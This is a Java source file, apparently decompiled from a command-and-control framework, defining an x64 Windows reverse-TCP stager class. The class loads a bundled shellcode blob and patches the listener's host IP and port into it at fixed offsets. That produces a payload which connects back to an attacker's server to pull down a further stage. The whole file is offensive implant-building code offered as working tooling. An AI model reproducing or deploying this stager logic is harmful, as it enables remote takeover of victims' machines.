package stagers;

import common.CommonUtils;
import common.Packer;
import common.ScListener;
import graph.Route;

public class ForeignReverseStagerX64 extends GenericStager {
   public ForeignReverseStagerX64(ScListener var1) {
      super(var1);
   }

   public String arch() {
      return "x64";
   }

   public String payload() {
      return "windows/foreign/reverse_tcp";
   }

   public byte[] generate() {
      String var1 = CommonUtils.bString(CommonUtils.readResource("resources/reverse64.bin")) + this.getConfig().getWatermark();
      long var2 = Route.ipToLong(this.getListener().getStagerHost());
      Packer var4 = new Packer();
      var4.addInt((int)var2);
      var1 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 242);
      var4 = new Packer();
      var4.addShort(this.getListener().getPort());
      var1 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 240);
      return CommonUtils.toBytes(var1);
   }
}
